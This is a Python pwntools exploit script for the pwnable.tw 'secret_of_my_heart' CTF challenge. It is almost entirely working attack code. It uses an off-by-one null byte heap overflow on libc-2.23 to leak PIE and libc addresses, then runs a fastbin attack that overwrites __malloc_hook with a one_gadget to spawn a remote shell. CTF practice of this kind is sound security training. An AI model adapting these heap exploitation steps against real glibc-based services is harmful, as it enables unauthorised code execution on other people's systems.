## libc-2.23

### HEAP: off one by null ###
from pwn import *
import time
import random


context.arch="amd64"
l = ELF("libc_64.so.6")
#r = process("./secret_of_my_heart", env={"LD_PRELOAD":"./libc_64.so.6"})
r = remote("chall.pwnable.tw", 10302)

time_ = int(time.time())
random.seed(time_)
print(f'time: {time_}')
print(f'rand: {hex(random.randint(0, 2147483647) & 0xfffff000)}')



def add(size, name, data):
    r.sendafter("choice :", "1")
    r.sendafter(":", str(size))
    r.sendafter(":", name)
    r.sendafter(":", data)

def show(idx):
    r.sendafter("choice :", "2")
    r.sendafter(":", str(idx))

def delete(idx):
    r.sendafter("choice :", "3")
    r.sendafter(":", str(idx))

def secret():
    r.sendafter("choice :", "4869")

def exit():
    r.sendafter("choice :", "4")



add(0x28, "1111", "i"*0x28) # chunk[0]
add(0x100, "2222", "j"*0x100 ) # chunk[1] 
add(0xf8, "3"*0x20, "k"*0xf0) # chunk[2]
show(2)
r.recvuntil("3"*0x20)
leak_pie = u64(r.recvn(6).ljust(8, b'\x00'))
print(f'leak_pie: {hex(leak_pie)}')


delete(1) ## unsorted bin header has libc
#input("@")
delete(0)
add(0x28, "4444", "l"*0x28) # chunk[0] ## null byte overflow

add(0x88, "5555", "m"*0x80) # chunk[1] ## small bin
add(0x28, "6666", "n"*0x8) # chunk[3]
#input("@")

delete(1)
delete(2)

#input("@")
add(0x88, "7777", "o"*0x20) # chunk[1]

#input("@")
add(0x100, "8888", "p"*0x20) # chunk[2]
add(0x88, "9999", "q"*0x20) # chunk[4]

#input("@")
delete(2)
show(3)
r.recvuntil("Secret : ")
leak_libc = u64(r.recvn(6).ljust(8, b'\x00')) 
libc_base = leak_libc - 0x3c3b78
print(f'leak_libc: {hex(libc_base)}')



### write libc_func hook by fastbin attack (but not double free to make circular linked list)
malloc_hook = libc_base + l.symbols[b'__malloc_hook']
print("__malloc_hook: ", hex(malloc_hook))

#input("@")
delete(1)
add(0x100, "aaaa", b"r"*0x80 + p64(0x0) + p64(0x71) + b"s"*0x60 + p64(0x0) + p64(0x21)) # chunk[1]
#input("@")
delete(3)
#input("@")




# overwrite malloc hook
delete(1)
add(0x100, "bbbb", b"t"*0x80 + p64(0x0) + p64(0x71) + p64(malloc_hook - 0x20 - 0x3) + b"u"*0x18) # chunk[1]
add(0x68, "cccc", "v"*0x8)

#r.interactive()

one_gadget = libc_base + 0xef6c4 #0xef6c4 #0x4526a # 0x45216 # 0xef6c4 # 0xf0567#  
add(0x68, "dddd", b"w"*(0x10 + 0x3) + p64(one_gadget)) # malloc_hook


r.sendafter("choice :", "3")
r.sendafter(":", "3")

r.interactive()




